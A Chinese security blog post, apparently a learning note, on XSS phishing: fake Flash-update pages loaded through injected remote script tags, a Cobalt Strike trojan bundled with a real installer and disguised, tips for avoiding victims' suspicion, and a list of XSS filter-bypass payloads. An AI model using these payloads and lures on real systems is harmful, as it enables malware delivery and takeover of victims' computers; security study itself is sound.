+        
+        <a  class="全部文章 "
+           href="/2024/05/28/Web%E5%AD%A6%E4%B9%A09/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习9">Web学习9</span>
+            <span class="post-date" title="2024-05-28 17:22:39">2024/05/28</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/28/Web%E5%AD%A6%E4%B9%A08/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习8">Web学习8</span>
+            <span class="post-date" title="2024-05-28 10:48:57">2024/05/28</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/27/Web%E5%AD%A6%E4%B9%A07/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习7">Web学习7</span>
+            <span class="post-date" title="2024-05-27 16:27:52">2024/05/27</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/27/%E5%85%B3%E4%BA%8EWindows%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%97%A0%E6%B3%95%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%E4%B9%8B%E9%97%AE/"
+           data-tag="Web,服务器"
+           data-author="" >
+            <span class="post-title" title="关于Windows服务器无法远程桌面连接之问">关于Windows服务器无法远程桌面连接之问</span>
+            <span class="post-date" title="2024-05-27 16:24:10">2024/05/27</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/26/Web%E5%AD%A6%E4%B9%A06/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习6">Web学习6</span>
+            <span class="post-date" title="2024-05-26 18:36:19">2024/05/26</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/26/Web%E5%AD%A6%E4%B9%A05/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习5">Web学习5</span>
+            <span class="post-date" title="2024-05-26 13:10:51">2024/05/26</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/25/Web%E5%AD%A6%E4%B9%A04/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习4">Web学习4</span>
+            <span class="post-date" title="2024-05-25 16:12:43">2024/05/25</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/23/Web%E5%AD%A6%E4%B9%A03/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习3">Web学习3</span>
+            <span class="post-date" title="2024-05-23 19:38:49">2024/05/23</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/23/Web%E5%AD%A6%E4%B9%A02/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习2">Web学习2</span>
+            <span class="post-date" title="2024-05-23 12:34:18">2024/05/23</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/05/22/Web%E5%AD%A6%E4%B9%A01/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="Web学习1">Web学习1</span>
+            <span class="post-date" title="2024-05-22 20:44:54">2024/05/22</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/04/29/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0/"
+           data-tag="Web,Linux"
+           data-author="" >
+            <span class="post-title" title="Linux操作系统学习">Linux操作系统学习</span>
+            <span class="post-date" title="2024-04-29 15:35:19">2024/04/29</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/04/28/%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%94%B6%E8%97%8F/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="绕过姿势收藏">绕过姿势收藏</span>
+            <span class="post-date" title="2024-04-28 19:55:29">2024/04/28</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/04/23/XYCTF-WP/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="XYCTF_WP">XYCTF_WP</span>
+            <span class="post-date" title="2024-04-23 12:54:05">2024/04/23</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/04/14/faker%E7%9A%84%E5%BF%83%E9%AD%94/"
+           data-tag="随想"
+           data-author="" >
+            <span class="post-title" title="faker的心魔">faker的心魔</span>
+            <span class="post-date" title="2024-04-14 21:23:39">2024/04/14</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2024/03/14/sql%E6%B3%A8%E5%85%A5/"
+           data-tag="Web"
+           data-author="" >
+            <span class="post-title" title="sql注入">sql注入</span>
+            <span class="post-date" title="2024-03-14 19:31:21">2024/03/14</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-初探XSS钓鱼" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">初探XSS钓鱼</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color4">Web</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2024-10-21 14:43:02'>2024-10-18 16:02</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E5%8F%AF%E4%BB%A5%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC%EF%BC%9F"><span class="toc-text">什么时候可以进行钓鱼？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E6%89%A7%E8%A1%8C"><span class="toc-text">具体执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%B6%E6%9D%86%E6%80%9D%E8%B7%AF"><span class="toc-text">收杆思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BF%E4%BB%A5%E5%90%8E%E7%9A%84%E6%93%8D%E4%BD%9C"><span class="toc-text">上线以后的操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E7%9A%84%E4%B8%89%E7%A7%8D%E7%B1%BB%E5%9E%8B"><span class="toc-text">XSS的三种类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-text">反射型XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-text">存储型XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EDOM%E7%9A%84XSS"><span class="toc-text">基于DOM的XSS</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E7%BB%95%E8%BF%87"><span class="toc-text">XSS绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#script%E5%85%B3%E9%94%AE%E5%AD%97%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-text">script关键字被过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#alert%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-text">alert被过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-text">空格被过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-text">单引号被过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%86%E5%88%86%E6%B3%95"><span class="toc-text">拆分法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8replace%E5%87%BD%E6%95%B0"><span class="toc-text">利用replace函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E5%88%A9%E7%94%A8"><span class="toc-text">XSS利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Cookie%E7%AA%83%E5%8F%96"><span class="toc-text">Cookie窃取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC"><span class="toc-text">网络钓鱼</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7"><span class="toc-text">相关工具</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90payload"><span class="toc-text">生成payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E5%AE%9E%E7%8E%B0"><span class="toc-text">具体实现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC"><span class="toc-text">生成木马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%81%94%E5%8A%A8XSS"><span class="toc-text">联动XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#getshell"><span class="toc-text">getshell</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="什么时候可以进行钓鱼？"><a href="#什么时候可以进行钓鱼？" class="headerlink" title="什么时候可以进行钓鱼？"></a><strong>什么时候可以进行钓鱼？</strong></h3><p>①网站存在XSS漏洞</p>
+<p>②站点已经getshell的情况</p>
+<p>在存在漏洞处放入payload</p>
+<p>&lt;sCRiPt sRC&#x3D;xss.com&#x2F;asdq&gt;&lt;&#x2F;sCrIpT&gt;</p>
+<h3 id="具体执行"><a href="#具体执行" class="headerlink" title="具体执行"></a><strong>具体执行</strong></h3><p>可以先放入探针，测试通过对方的ua头，检查对面电脑的基本情况</p>
+<p><strong>66analytics</strong>这个工具可以记录在后台记录整个操作的视频，甚至还可以记录鼠标的点击和移动过程</p>
+<p>然后可以针对目标，放入类似flash更新，浏览器版本更新的模版</p>
+<p><img src="/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021122924451.png"></p>
+<p>可以根据目标浏览器的语言情况，设置繁简两种模板，不容易被察觉</p>
+<p>放在最醒目位置的就是冲锋马，然后还需要维权马，还需要有操作马</p>
+<p>在对面双击后，可以做收杆的操作，这样是为了在上线之后，撤掉站点的flash更新和浏览器崩溃等模版</p>
+<h3 id="收杆思路"><a href="#收杆思路" class="headerlink" title="收杆思路"></a><strong>收杆思路</strong></h3><p>收杆有两种思路，第一种是按次数来收杆，给浏览器的cookie设置值，每刷新1次，就增加1</p>
+<p>第二种是可以给马加一个随机数，由xss平台来生成，这样下载的时候类chromeupdate_xxxx.exe，然后把这xxxx返回给平台，平台来控制撤杆</p>
+<p>第二种方式缺点：比较容易被浏览器检测出来   +</p>
+<p>收杆的作用是让攻击者可以下载你的马，然后控制对方的电脑权限，弹窗一般就弹三次，不然会引起对方的怀疑，所以需要及时的撤回页面，这样比较稳妥</p>
+<h3 id="上线以后的操作"><a href="#上线以后的操作" class="headerlink" title="上线以后的操作"></a><strong>上线以后的操作</strong></h3><p>上线了以后可以进一步的执行提权操作</p>
+<p>例子：上线了一台电脑后，假如说他是工作组，你不能通过内网渗透的方式去突破，比较困难，也不是域的环境，该怎么做？</p>
+<p>答：使用tdata劫持他的数据，用快捷方式做马</p>
+<p>钓鱼平台需要自己去搭，公开的xss平台有，xssplatform</p>
+<p>小目标就直接上弹窗就可以了</p>
+<p><strong>听完师傅讲的XSS钓鱼后，因为兴趣使然，我又去找了个公开课做进一步的拓展</strong></p>
+<h3 id="XSS的三种类型"><a href="#XSS的三种类型" class="headerlink" title="XSS的三种类型"></a>XSS的三种类型</h3><p>反射型XSS，存储型XSS，基于DOM的XSS</p>
+<h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>反射型XSS也称非持久性型XSS，他攻击是一次性的，仅对单次的页面访问产生影响。非持久型XSS攻击用户访问一个被攻击者篡改后的链接来诱使客户点击，比如这样的一段链接：</p>
+<p><code>www.joker.com/?params=&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>
+<p>用户访问该链接时，被植入的攻击脚本被用户浏览器执行，从而达到攻击的目的。</p>
+<p><img src="/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021132700760.png"></p>
+<h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><p>存储型XSS与反弹型XSS的特点刚好相反，它构造的恶意代码会经过服务器端的存储所以可以多次触发执行，故又称为持久性XSS，该类型的XSS攻击通过一些手法把恶意脚本向服务器端的数据库中写入进去，当有用户浏览相对应的web界面时便会触发恶意代码执行。</p>
+<p><img src="/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021132840979.png"></p>
+<h4 id="基于DOM的XSS"><a href="#基于DOM的XSS" class="headerlink" title="基于DOM的XSS"></a>基于DOM的XSS</h4><p>基于DOM的XSS没经过服务器，所以又称为<strong>本地XSS</strong>，这种类型则是利用非法输入来闭合对应的html标签。比如有这样的 一个 a标签：&lt;a href&#x3D;’$var’&gt;&lt;&#x2F;a&gt;，乍看问题不大，可是当$var的内容变为’onclick&#x3D;’alert(&#x2F;xss&#x2F;)&#x2F;&#x2F;，这段代码就会被执行</p>
+<p><img src="/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021133351242.png"></p>
+<h3 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h3><p>script关键字被过滤</p>
+<p>alert被过滤</p>
+<p>空格被过滤</p>
+<p>单引号被过滤</p>
+<p>拆分法</p>
+<h4 id="script关键字被过滤"><a href="#script关键字被过滤" class="headerlink" title="script关键字被过滤"></a>script关键字被过滤</h4><p><strong>大小写</strong></p>
+<p>在测试的过程中，我们可以改变测试语句的大小写来绕过XSS规则，师傅在培训的时候写的xss代码就利用到了大小写的绕过方式</p>
+<p>比如：</p>
+<p><code>&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt; 可以转换为 &lt;ScRipt&gt;ALeRt(&quot;XSS&quot;);&lt;/sCRipT&gt;</code></p>
+<p><strong>嵌套</strong></p>
+<p>嵌套&lt;script&gt;和&lt;&#x2F;script&gt;突破</p>
+<p>&lt;sc&lt;script&gt;ript&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;  这种绕过和做web题常遇到的双写绕过是类似的</p>
+<p><strong>img标签突破</strong></p>
+<p>有些网站可能没有对img标签进行限制</p>
+<pre><code>&lt;img src=# onerror=&quot;alert(&#39;xss&#39;)&quot;&gt;
+
+&lt;img/src/onerror=alert(1)&gt;
+
+&lt;img/src=&#39;a&#39;onerror=[1].find(alert)&gt;
+</code></pre>
+<p><strong>&lt;iframe&gt;标签突破</strong></p>
+<pre><code>&lt;iframe onload=alert(1)&gt;
+</code></pre>
+<h4 id="alert被过滤"><a href="#alert被过滤" class="headerlink" title="alert被过滤"></a>alert被过滤</h4><p><strong>data协议</strong></p>
+<pre><code>&lt;object
+
+data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgnZGF0YSBwcm90b2NvbCcpPC9zY3JpcHQ+&quot;&gt;&lt;/object&gt;
+
+&lt;link/rel=prefetch
+
+import href=data:q;base64.PHMjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg&gt;
+</code></pre>
+<p><strong>prompt替换</strong></p>
+<pre><code>&lt;script&gt;promt(1)&lt;/script&gt;
+</code></pre>
+<p><strong>confirm替换</strong></p>
+<pre><code>&lt;script&gt;confirm(1)&lt;/script&gt;
+</code></pre>
+<h4 id="空格被过滤"><a href="#空格被过滤" class="headerlink" title="空格被过滤"></a>空格被过滤</h4><p>用&#x2F;**&#x2F;或者&#x2F;</p>
+<pre><code>&lt;img/src/onerror=alert(1)&gt;
+</code></pre>
+<h4 id="单引号被过滤"><a href="#单引号被过滤" class="headerlink" title="单引号被过滤"></a>单引号被过滤</h4><p><strong>反引号替代</strong></p>
+<pre><code>&lt;img/src=#/onerror=&quot;alert(xss2)&quot;&gt;
+</code></pre>
+<p><strong>斜杠替代</strong></p>
+<pre><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;
+</code></pre>
+<h4 id="拆分法"><a href="#拆分法" class="headerlink" title="拆分法"></a>拆分法</h4><p>当web应用程序对目标用户输入的长度进行了限制时，这时无法注入较长的 XSS攻击向量，但是在特定情况下 ，这种限制可通过拆分注入的方法进行绕过，如下面的构造方法：</p>
+<p><img src="/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021134820160.png"></p>
+<p>上述代码单看是不完整的，总体看通过拆分法拼凑可以得到了如下完整的攻击向量：</p>
+<p><img src="/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021134841615.png"></p>
+<h4 id="利用replace函数"><a href="#利用replace函数" class="headerlink" title="利用replace函数"></a>利用replace函数</h4><p>str1ng”.replace(&#x2F;1&#x2F;,alert),&#x2F;&#x2F; 执行效果相当于alert(1)造成xss，这是DOM型的XSS</p>
+<h3 id="XSS利用"><a href="#XSS利用" class="headerlink" title="XSS利用"></a>XSS利用</h3><p>Cookie窃取&amp;网络钓鱼</p>
+<h4 id="Cookie窃取"><a href="#Cookie窃取" class="headerlink" title="Cookie窃取"></a>Cookie窃取</h4><p>服务器为了分辨出不同用户的身份，需要生成cookie，将访问者的一些基本信息，例如身份信息识别、密钥、浏览方式、系统参数等，在浏览器客户端保存于目标用户的这些信息当用户再次访问该web站点时，相对应的 cookie就会被该网站进行填充与服务器进行交互。</p>
+<p>运行条件：</p>
+<p>1、存在XSS漏洞</p>
+<p>2、远程接收cookie</p>
+<h4 id="网络钓鱼"><a href="#网络钓鱼" class="headerlink" title="网络钓鱼"></a>网络钓鱼</h4><p>网络诈骗中存在一种攻击性行为的方式便是网络钓鱼，攻击者一般会制作带有欺骗性的E-mail，或者高度仿冒的Web界面（钓鱼界面）网站来进行攻击，其中网络钓鱼结合上XSS的攻击方式是目前来说威胁性极高的。</p>
+<p>一、<strong>重定向</strong>钓鱼：将官方网站页面重定向到攻击者自己制作的恶意网站</p>
+<p>二、iframe标签钓鱼：通过HTML中的&lt;iframe&gt;标签嵌入攻击者自己的恶意钓鱼界面实现。</p>
+<p>三、HTML注入钓鱼：直接将HTML或者JavaScript代码在漏洞处利用XSS注入此页面中。 PS：这次打信安行业决赛的时候，有一道题应该就是需要利用HTML注入漏洞，然后使用HTML代码进行XSS注入一句话木马达成getshell</p>
+<h3 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h3><p><strong>CobaltSrike</strong></p>
+<p>监听器&#x2F;生成payload</p>
+<p>监听器是Cobalt Strike与bot之间进行通讯的核心模块，同时是有效负载的配置信息以及告诉Cobalt Strike服务器以从该有效负载接收连接指令，其实是位于有效载荷配置上层的一个抽象概念。</p>
+<p>监听器由用户定义的名称、有效负载类型，主机，端口等其他信息组成，用于定义有效负载的存放位置。</p>
+<h4 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h4><p>(1)Payload Generator</p>
+<p>这个模块可以生成各种语言的后门Payload，例如：C,C#,Python,Java,Perl,Powershell脚本,Powershell命令,Ruby,Raw,免杀框架Veli中的shellcode等等，因为它可以生成一串可执行的命令，只需要在目标机器上执行这串命令就行，无需做其他操作就可以得到目标机器的shell。</p>
+<p>(2)Windows Dropper</p>
+<p>这是一个可以和windows程序进行捆绑的选项，可以把后门和别的正常的程序捆绑在一起，比如qq，微信之类的程序，一般钓鱼&#x2F;社工的时候会用到。</p>
+<p>(3) Windows Excutable&#x2F;Windows Excutable(s)</p>
+<p>这个选项是生成windows可执行程序，例:exe、dll。</p>
+<h3 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h3><p><img src="/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021141603840.png"></p>
+<p>这种图大概就是XSS钓鱼的整个过程</p>
+<h4 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h4><p>使用<strong>cobaltstrike</strong>生成一个木马</p>
+<p><img src="/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021141712979.png"></p>
+<p>再从官网下载官方的flash安装包，将两个文件放一起压缩成压缩文件。</p>
+<img src="/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021141815694.png" style="zoom:50%;">
+
+<img src="/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021141938027.png" style="zoom:50%;">
+
+<img src="/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021142006376.png" style="zoom:50%;">
+
+<img src="/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021142025235.png" style="zoom:50%;">
+
+<img src="/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021142109438.png" style="zoom:50%;">
+
+
+
+<img src="/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021142128347.png" style="zoom: 25%;">
+
+<p>解压后自动运行木马程序</p>
+<p>再使用<strong>ResourceHacker</strong>工具，对压缩文件的图标进行修改</p>
+<p><img src="/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021142247468.png"></p>
+<h4 id="联动XSS"><a href="#联动XSS" class="headerlink" title="联动XSS"></a>联动XSS</h4><p>再在钓鱼界面的代码中，修改访问木马的url地址</p>
+<p>打开靶机，插入xss的payload</p>
+<p><code>test&lt;script src=http://xxxxxxxxxx/dy/flash/xss.js&gt;&lt;/script&gt;</code></p>
+<p><img src="/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021142357860.png"></p>
+<p>这里可以修改域名，增加真实性。</p>
+<p><img src="/2024/10/18/%E5%88%9D%E6%8E%A2XSS%E9%92%93%E9%B1%BC/image-20241021142512433.png"></p>
+<p>当你点击后就会跳转到钓鱼页面，然后下载预先准备好的木马程序</p>
+<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>然后再使用Cobalt Strike就可以执行一系列的服务器命令</p>
+
+      
+       
+    </div>
+</article>
+
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2024 f4k3r
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+<div id="musicMouseDrag" style="position:fixed; z-index: 9999; bottom: 0; right: 50px;">
+    <div id="musicDragArea" style="position: absolute; top: 0; left: 0; width: 100%;height: 10px;cursor: move; z-index: 10;"></div>
+    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=298 height=52 src="//music.163.com/outchain/player?type=2&id=478507889&auto=1&height=32"></iframe>
+    </div>
+
+<script>
+    var $DOC = $(document)
+    $('#musicMouseDrag').on('mousedown', function (e) {
+      // 阻止文本选中
+      $DOC.bind("selectstart", function () {
+        return false;
+      });
+      $('#musicDragArea').css('height', '100%');
+      var $moveTarget = $('#musicMouseDrag');
+      $moveTarget.css('border', '1px dashed grey')
+      var div_x = e.pageX - $moveTarget.offset().left;
+      var div_y = e.pageY - $moveTarget.offset().top;
+      $DOC.on('mousemove', function (e) {
+        var targetX = e.pageX - div_x;
+        var targetY = e.pageY - div_y;
+        targetX = targetX < 0 ? 0 : (targetX + $moveTarget.outerWidth() >= window.innerWidth) ? window.innerWidth - $moveTarget.outerWidth() : targetX;
+        targetY = targetY < 0 ? 0 : (targetY + $moveTarget.outerHeight() >= window.innerHeight) ? window.innerHeight - $moveTarget.outerHeight() : targetY;
+        $moveTarget.css({'left': targetX + 'px', 'top': targetY + 'px', 'bottom': 'inherit', 'right': 'inherit'})
+      }).on('mouseup', function () {
+        $DOC.unbind("selectstart");
+        $DOC.off('mousemove')
+        $DOC.off('mouseup')
+        $moveTarget.css('border', 'none')
+        $('#musicDragArea').css('height', '10px');
+      })
+    })
+</script>
+
+</html>
